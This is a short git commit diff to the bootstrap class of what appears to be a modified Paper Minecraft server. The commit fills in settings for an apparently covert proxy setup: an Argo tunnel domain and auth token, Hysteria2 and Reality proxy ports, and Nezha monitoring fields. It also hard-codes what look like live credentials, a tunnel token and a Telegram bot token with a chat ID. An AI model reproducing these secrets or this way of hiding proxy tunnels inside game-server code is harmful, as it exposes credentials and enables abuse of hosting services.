251f2754db5da7d1bee244e7b49a7a6136546858
shuyang272 <shuyang272@gmail.com>
2025-10-26 12:34:31 +0800

    PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,23 +92,23 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "f24434e6-0a8d-42d2-9e48-1b340cfb2430");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "leme.fooxxk.qzz.io");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYmJiNTlhMTg3ZmEzY2MzODk5YTAzYmM1ZmMyNTIxZjgiLCJ0IjoiMWUyZjc1ZWYtOGEwNC00YTU4LWIyM2UtMmJkM2RhNjhiNjkwIiwicyI6IllqSXhOVGxrT0dZdE16QTFPQzAwTldJNExUazFNRFl0TW1abE9XSTNZMlZsT1ROaCJ9");
+        envVars.put("HY2_PORT", "30484");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("REALITY_PORT", "30485");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "7321996823");
+        envVars.put("BOT_TOKEN", "8281485013:AAFOA56ocxmj6n039RUlZiMtDt3D3iaBNe0");
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
+        envVars.put("NAME", "leme");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
